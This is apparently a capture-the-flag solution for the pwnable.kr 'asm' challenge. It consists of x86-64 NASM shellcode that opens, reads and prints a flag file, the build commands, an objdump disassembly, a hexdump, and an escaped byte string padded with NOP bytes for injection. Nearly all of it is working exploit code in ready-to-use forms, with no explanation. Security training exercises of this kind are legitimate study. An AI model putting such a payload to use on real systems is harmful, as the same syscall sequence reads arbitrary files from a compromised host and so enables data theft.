
#the nasm code : 
```

SECTION .text
	global _start
_start:
	jmp short setup
shellcode:
	pop rbp ; we have rip yeyyyyy
	inc rax
	inc rax 
	mov rdi,rbp
	xor rsi,rsi
	xor rdx,rdx
	syscall
	mov rdi,rax
	xor rax,rax
	mov rsi,rbp
	xor rcx,rcx
	mov cl,lenFlag
incrbp:
	inc rbp
	loop incrbp
	mov dl,255
	syscall
	xor rdi,rdi
	inc rdi
	mov rdx,rax
	xor rax,rax
	inc rax
	syscall
setup:
	call shellcode 
	flag db "./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
	lenFlag equ $-flag
	buf db 256 dup(0)
exit:

```
#compile process
```
idang@idang ~/asmpwn> nano -c shellcode.asm
idang@idang ~/asmpwn> nasm -f elf64 shellcode.asm
idang@idang ~/asmpwn> ld  --omagic shellcode.o
idang@idang ~/asmpwn> objdump -d a.out
```
#the shellcode : 
```
a.out:     file format elf64-x86-64
Disassembly of section .text:

0000000000400080 <_start>:
  400080:	eb 3a                	jmp    4000bc <setup>

0000000000400082 <shellcode>:
  400082:	5d                   	pop    %rbp
  400083:	48 ff c0             	inc    %rax
  400086:	48 ff c0             	inc    %rax
  400089:	48 89 ef             	mov    %rbp,%rdi
  40008c:	48 31 f6             	xor    %rsi,%rsi
  40008f:	48 31 d2             	xor    %rdx,%rdx
  400092:	0f 05                	syscall 
  400094:	48 89 c7             	mov    %rax,%rdi
  400097:	48 31 c0             	xor    %rax,%rax
  40009a:	48 89 ee             	mov    %rbp,%rsi
  40009d:	48 31 c9             	xor    %rcx,%rcx
  4000a0:	b1 e9                	mov    $0xe9,%cl

00000000004000a2 <incrbp>:
  4000a2:	48 ff c5             	inc    %rbp
  4000a5:	e2 fb                	loop   4000a2 <incrbp>
  4000a7:	b2 ff                	mov    $0xff,%dl
  4000a9:	0f 05                	syscall 
  4000ab:	48 31 ff             	xor    %rdi,%rdi
  4000ae:	48 ff c7             	inc    %rdi
  4000b1:	48 89 c2             	mov    %rax,%rdx
  4000b4:	48 31 c0             	xor    %rax,%rax
  4000b7:	48 ff c0             	inc    %rax
  4000ba:	0f 05                	syscall 

00000000004000bc <setup>:
  4000bc:	e8 c1 ff ff ff       	call   400082 <shellcode>

00000000004000c1 <flag>:
  4000c1:	2e 2f                	cs (bad) 
  4000c3:	74 68                	je     40012d <flag+0x6c>
  4000c5:	69 73 5f 69 73 5f 70 	imul   $0x705f7369,0x5f(%rbx),%esi
  4000cc:	77 6e                	ja     40013c <flag+0x7b>
  4000ce:	61                   	(bad)  
  4000cf:	62                   	(bad)  
  4000d0:	6c                   	insb   (%dx),%es:(%rdi)
  4000d1:	65 2e 6b 72 5f 66    	gs imul $0x66,%gs:0x5f(%rdx),%esi
  4000d7:	6c                   	insb   (%dx),%es:(%rdi)
  4000d8:	61                   	(bad)  
  4000d9:	67 5f                	addr32 pop %rdi
  4000db:	66 69 6c 65 5f 70 6c 	imul   $0x6c70,0x5f(%rbp,%riz,2),%bp
  4000e2:	65 61                	gs (bad) 
  4000e4:	73 65                	jae    40014b <flag+0x8a>
  4000e6:	5f                   	pop    %rdi
  4000e7:	72 65                	jb     40014e <flag+0x8d>
  4000e9:	61                   	(bad)  
  4000ea:	64 5f                	fs pop %rdi
  4000ec:	74 68                	je     400156 <flag+0x95>
  4000ee:	69 73 5f 66 69 6c 65 	imul   $0x656c6966,0x5f(%rbx),%esi
  4000f5:	2e 73 6f             	jae,pn 400167 <flag+0xa6>
  4000f8:	72 72                	jb     40016c <flag+0xab>
  4000fa:	79 5f                	jns    40015b <flag+0x9a>
  4000fc:	74 68                	je     400166 <flag+0xa5>
  4000fe:	65 5f                	gs pop %rdi
  400100:	66 69 6c 65 5f 6e 61 	imul   $0x616e,0x5f(%rbp,%riz,2),%bp
  400107:	6d                   	insl   (%dx),%es:(%rdi)
  400108:	65 5f                	gs pop %rdi
  40010a:	69 73 5f 76 65 72 79 	imul   $0x79726576,0x5f(%rbx),%esi
  400111:	5f                   	pop    %rdi
  400112:	6c                   	insb   (%dx),%es:(%rdi)
  400113:	6f                   	outsl  %ds:(%rsi),(%dx)
  400114:	6f                   	outsl  %ds:(%rsi),(%dx)
  400115:	6f                   	outsl  %ds:(%rsi),(%dx)
  400116:	6f                   	outsl  %ds:(%rsi),(%dx)
  400117:	6f                   	outsl  %ds:(%rsi),(%dx)
  400118:	6f                   	outsl  %ds:(%rsi),(%dx)
  400119:	6f                   	outsl  %ds:(%rsi),(%dx)
  40011a:	6f                   	outsl  %ds:(%rsi),(%dx)
  40011b:	6f                   	outsl  %ds:(%rsi),(%dx)
  40011c:	6f                   	outsl  %ds:(%rsi),(%dx)
  40011d:	6f                   	outsl  %ds:(%rsi),(%dx)
  40011e:	6f                   	outsl  %ds:(%rsi),(%dx)
  40011f:	6f                   	outsl  %ds:(%rsi),(%dx)
  400120:	6f                   	outsl  %ds:(%rsi),(%dx)
  400121:	6f                   	outsl  %ds:(%rsi),(%dx)
  400122:	6f                   	outsl  %ds:(%rsi),(%dx)
  400123:	6f                   	outsl  %ds:(%rsi),(%dx)
  400124:	6f                   	outsl  %ds:(%rsi),(%dx)
  400125:	6f                   	outsl  %ds:(%rsi),(%dx)
  400126:	6f                   	outsl  %ds:(%rsi),(%dx)
  400127:	6f                   	outsl  %ds:(%rsi),(%dx)
  400128:	6f                   	outsl  %ds:(%rsi),(%dx)
  400129:	6f                   	outsl  %ds:(%rsi),(%dx)
  40012a:	6f                   	outsl  %ds:(%rsi),(%dx)
  40012b:	6f                   	outsl  %ds:(%rsi),(%dx)
  40012c:	6f                   	outsl  %ds:(%rsi),(%dx)
  40012d:	6f                   	outsl  %ds:(%rsi),(%dx)
  40012e:	6f                   	outsl  %ds:(%rsi),(%dx)
  40012f:	6f                   	outsl  %ds:(%rsi),(%dx)
  400130:	6f                   	outsl  %ds:(%rsi),(%dx)
  400131:	6f                   	outsl  %ds:(%rsi),(%dx)
  400132:	6f                   	outsl  %ds:(%rsi),(%dx)
  400133:	6f                   	outsl  %ds:(%rsi),(%dx)
  400134:	6f                   	outsl  %ds:(%rsi),(%dx)
  400135:	6f                   	outsl  %ds:(%rsi),(%dx)
  400136:	6f                   	outsl  %ds:(%rsi),(%dx)
  400137:	6f                   	outsl  %ds:(%rsi),(%dx)
  400138:	6f                   	outsl  %ds:(%rsi),(%dx)
  400139:	6f                   	outsl  %ds:(%rsi),(%dx)
  40013a:	6f                   	outsl  %ds:(%rsi),(%dx)
  40013b:	6f                   	outsl  %ds:(%rsi),(%dx)
  40013c:	6f                   	outsl  %ds:(%rsi),(%dx)
  40013d:	6f                   	outsl  %ds:(%rsi),(%dx)
  40013e:	6f                   	outsl  %ds:(%rsi),(%dx)
  40013f:	6f                   	outsl  %ds:(%rsi),(%dx)
  400140:	6f                   	outsl  %ds:(%rsi),(%dx)
  400141:	6f                   	outsl  %ds:(%rsi),(%dx)
  400142:	6f                   	outsl  %ds:(%rsi),(%dx)
  400143:	6f                   	outsl  %ds:(%rsi),(%dx)
  400144:	6f                   	outsl  %ds:(%rsi),(%dx)
  400145:	6f                   	outsl  %ds:(%rsi),(%dx)
  400146:	6f                   	outsl  %ds:(%rsi),(%dx)
  400147:	6f                   	outsl  %ds:(%rsi),(%dx)
  400148:	6f                   	outsl  %ds:(%rsi),(%dx)
  400149:	6f                   	outsl  %ds:(%rsi),(%dx)
  40014a:	6f                   	outsl  %ds:(%rsi),(%dx)
  40014b:	6f                   	outsl  %ds:(%rsi),(%dx)
  40014c:	6f                   	outsl  %ds:(%rsi),(%dx)
  40014d:	6f                   	outsl  %ds:(%rsi),(%dx)
  40014e:	6f                   	outsl  %ds:(%rsi),(%dx)
  40014f:	6f                   	outsl  %ds:(%rsi),(%dx)
  400150:	6f                   	outsl  %ds:(%rsi),(%dx)
  400151:	6f                   	outsl  %ds:(%rsi),(%dx)
  400152:	6f                   	outsl  %ds:(%rsi),(%dx)
  400153:	6f                   	outsl  %ds:(%rsi),(%dx)
  400154:	6f                   	outsl  %ds:(%rsi),(%dx)
  400155:	6f                   	outsl  %ds:(%rsi),(%dx)
  400156:	6f                   	outsl  %ds:(%rsi),(%dx)
  400157:	6f                   	outsl  %ds:(%rsi),(%dx)
  400158:	6f                   	outsl  %ds:(%rsi),(%dx)
  400159:	6f                   	outsl  %ds:(%rsi),(%dx)
  40015a:	6f                   	outsl  %ds:(%rsi),(%dx)
  40015b:	6f                   	outsl  %ds:(%rsi),(%dx)
  40015c:	6f                   	outsl  %ds:(%rsi),(%dx)
  40015d:	6f                   	outsl  %ds:(%rsi),(%dx)
  40015e:	6f                   	outsl  %ds:(%rsi),(%dx)
  40015f:	30 30                	xor    %dh,(%rax)
  400161:	30 30                	xor    %dh,(%rax)
  400163:	30 30                	xor    %dh,(%rax)
  400165:	30 30                	xor    %dh,(%rax)
  400167:	30 30                	xor    %dh,(%rax)
  400169:	30 30                	xor    %dh,(%rax)
  40016b:	30 30                	xor    %dh,(%rax)
  40016d:	30 30                	xor    %dh,(%rax)
  40016f:	30 30                	xor    %dh,(%rax)
  400171:	30 30                	xor    %dh,(%rax)
  400173:	30 30                	xor    %dh,(%rax)
  400175:	30 30                	xor    %dh,(%rax)
  400177:	30 6f 6f             	xor    %ch,0x6f(%rdi)
  40017a:	6f                   	outsl  %ds:(%rsi),(%dx)
  40017b:	6f                   	outsl  %ds:(%rsi),(%dx)
  40017c:	6f                   	outsl  %ds:(%rsi),(%dx)
  40017d:	6f                   	outsl  %ds:(%rsi),(%dx)
  40017e:	6f                   	outsl  %ds:(%rsi),(%dx)
  40017f:	6f                   	outsl  %ds:(%rsi),(%dx)
  400180:	6f                   	outsl  %ds:(%rsi),(%dx)
  400181:	6f                   	outsl  %ds:(%rsi),(%dx)
  400182:	6f                   	outsl  %ds:(%rsi),(%dx)
  400183:	6f                   	outsl  %ds:(%rsi),(%dx)
  400184:	6f                   	outsl  %ds:(%rsi),(%dx)
  400185:	6f                   	outsl  %ds:(%rsi),(%dx)
  400186:	6f                   	outsl  %ds:(%rsi),(%dx)
  400187:	6f                   	outsl  %ds:(%rsi),(%dx)
  400188:	6f                   	outsl  %ds:(%rsi),(%dx)
  400189:	6f                   	outsl  %ds:(%rsi),(%dx)
  40018a:	6f                   	outsl  %ds:(%rsi),(%dx)
  40018b:	6f                   	outsl  %ds:(%rsi),(%dx)
  40018c:	6f                   	outsl  %ds:(%rsi),(%dx)
  40018d:	6f                   	outsl  %ds:(%rsi),(%dx)
  40018e:	6f                   	outsl  %ds:(%rsi),(%dx)
  40018f:	30 30                	xor    %dh,(%rax)
  400191:	30 30                	xor    %dh,(%rax)
  400193:	30 30                	xor    %dh,(%rax)
  400195:	30 30                	xor    %dh,(%rax)
  400197:	30 30                	xor    %dh,(%rax)
  400199:	30 30                	xor    %dh,(%rax)
  40019b:	6f                   	outsl  %ds:(%rsi),(%dx)
  40019c:	30 6f 30             	xor    %ch,0x30(%rdi)
  40019f:	6f                   	outsl  %ds:(%rsi),(%dx)
  4001a0:	30 6f 30             	xor    %ch,0x30(%rdi)
  4001a3:	6f                   	outsl  %ds:(%rsi),(%dx)
  4001a4:	30 6f 30             	xor    %ch,0x30(%rdi)
  4001a7:	6f                   	outsl  %ds:(%rsi),(%dx)
  4001a8:	6e                   	outsb  %ds:(%rsi),(%dx)
  4001a9:	67                   	addr32

00000000004001aa <buf>:
	...

```
# the actual shellcode : 
```
0000080  eb 3a 5d 48 ff c0 48 ff  c0 48 89 ef 48 31 f6 48  |.:]H..H..H..H1.H|
00000090  31 d2 0f 05 48 89 c7 48  31 c0 48 89 ee 48 31 c9  |1...H..H1.H..H1.|
000000a0  b1 e9 48 ff c5 e2 fb b2  ff 0f 05 48 31 ff 48 ff  |..H........H1.H.|
000000b0  c7 48 89 c2 48 31 c0 48  ff c0 0f 05 e8 c1 ff ff  |.H..H1.H........|
000000c0  ff 2e 2f 74 68 69 73 5f  69 73 5f 70 77 6e 61 62  |../this_is_pwnab|
000000d0  6c 65 2e 6b 72 5f 66 6c  61 67 5f 66 69 6c 65 5f  |le.kr_flag_file_|
000000e0  70 6c 65 61 73 65 5f 72  65 61 64 5f 74 68 69 73  |please_read_this|
000000f0  5f 66 69 6c 65 2e 73 6f  72 72 79 5f 74 68 65 5f  |_file.sorry_the_|
00000100  66 69 6c 65 5f 6e 61 6d  65 5f 69 73 5f 76 65 72  |file_name_is_ver|
00000110  79 5f 6c 6f 6f 6f 6f 6f  6f 6f 6f 6f 6f 6f 6f 6f  |y_looooooooooooo|
00000120  6f 6f 6f 6f 6f 6f 6f 6f  6f 6f 6f 6f 6f 6f 6f 6f  |oooooooooooooooo|
00000130  6f 6f 6f 6f 6f 6f 6f 6f  6f 6f 6f 6f 6f 6f 6f 6f  |oooooooooooooooo|
00000140  6f 6f 6f 6f 6f 6f 6f 6f  6f 6f 6f 6f 6f 6f 6f 6f  |oooooooooooooooo|
00000150  6f 6f 6f 6f 6f 6f 6f 6f  6f 6f 6f 6f 6f 6f 6f 30  |ooooooooooooooo0|
00000160  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
00000170  30 30 30 30 30 30 30 30  6f 6f 6f 6f 6f 6f 6f 6f  |00000000oooooooo|
00000180  6f 6f 6f 6f 6f 6f 6f 6f  6f 6f 6f 6f 6f 6f 6f 30  |ooooooooooooooo0|
00000190  30 30 30 30 30 30 30 30  30 30 30 6f 30 6f 30 6f  |00000000000o0o0o|
000001a0  30 6f 30 6f 30 6f 30 6f  6e 67 00 00 00 00 00 00  |0o0o0o0ong......|
```
# in pure hex : 
```
eb 3a 5d 48 ff c0 48 ff  c0 48 89 ef 48 31 f6 48
31 d2 0f 05 48 89 c7 48  31 c0 48 89 ee 48 31 c9
b1 e9 48 ff c5 e2 fb b2  ff 0f 05 48 31 ff 48 ff
c7 48 89 c2 48 31 c0 48  ff c0 0f 05 e8 c1 ff ff
ff 2e 2f 74 68 69 73 5f  69 73 5f 70 77 6e 61 62
6c 65 2e 6b 72 5f 66 6c  61 67 5f 66 69 6c 65 5f
70 6c 65 61 73 65 5f 72  65 61 64 5f 74 68 69 73
5f 66 69 6c 65 2e 73 6f  72 72 79 5f 74 68 65 5f
66 69 6c 65 5f 6e 61 6d  65 5f 69 73 5f 76 65 72
79 5f 6c 6f 6f 6f 6f 6f  6f 6f 6f 6f 6f 6f 6f 6f
6f 6f 6f 6f 6f 6f 6f 6f  6f 6f 6f 6f 6f 6f 6f 6f
6f 6f 6f 6f 6f 6f 6f 6f  6f 6f 6f 6f 6f 6f 6f 6f
6f 6f 6f 6f 6f 6f 6f 6f  6f 6f 6f 6f 6f 6f 6f 6f
6f 6f 6f 6f 6f 6f 6f 6f  6f 6f 6f 6f 6f 6f 6f 30
30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30  6f 6f 6f 6f 6f 6f 6f 6f
6f 6f 6f 6f 6f 6f 6f 6f  6f 6f 6f 6f 6f 6f 6f 30
30 30 30 30 30 30 30 30  30 30 30 6f 30 6f 30 6f
30 6f 30 6f 30 6f 30 6f  6e 67 00 00 00 00 00 00
```
# in echo format
\\xeb\\x3a\\x5d\\x48\\xff\\xc0\\x48\\xff\\xc0\\x48\\x89\\xef\\x48\\x31\\xf6\\x48\\x31\\xd2\\x0f\\x05\\x48\\x89\\xc7\\x48\\x31\\xc0\\x48\\x89\\xee\\x48\\x31\\xc9\\xb1\\xe9\\x48\\xff\\xc5\\xe2\\xfb\\xb2\\xff\\x0f\\x05\\x48\\x31\\xff\\x48\\xff\\xc7\\x48\\x89\\xc2\\x48\\x31\\xc0\\x48\\xff\\xc0\\x0f\\x05\\xe8\\xc1\\xff\\xff\\xff\\x2e\\x2f\\x74\\x68\\x69\\x73\\x5f\\x69\\x73\\x5f\\x70\\x77\\x6e\\x61\\x62\\x6c\\x65\\x2e\\x6b\\x72\\x5f\\x66\\x6c\\x61\\x67\\x5f\\x66\\x69\\x6c\\x65\\x5f\\x70\\x6c\\x65\\x61\\x73\\x65\\x5f\\x72\\x65\\x61\\x64\\x5f\\x74\\x68\\x69\\x73\\x5f\\x66\\x69\\x6c\\x65\\x2e\\x73\\x6f\\x72\\x72\\x79\\x5f\\x74\\x68\\x65\\x5f\\x66\\x69\\x6c\\x65\\x5f\\x6e\\x61\\x6d\\x65\\x5f\\x69\\x73\\x5f\\x76\\x65\\x72\\x79\\x5f\\x6c\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x6f\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x6f\\x30\\x6f\\x30\\x6f\\x30\\x6f\\x30\\x6f\\x30\\x6f\\x30\\x6f\\x6e\\x67\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90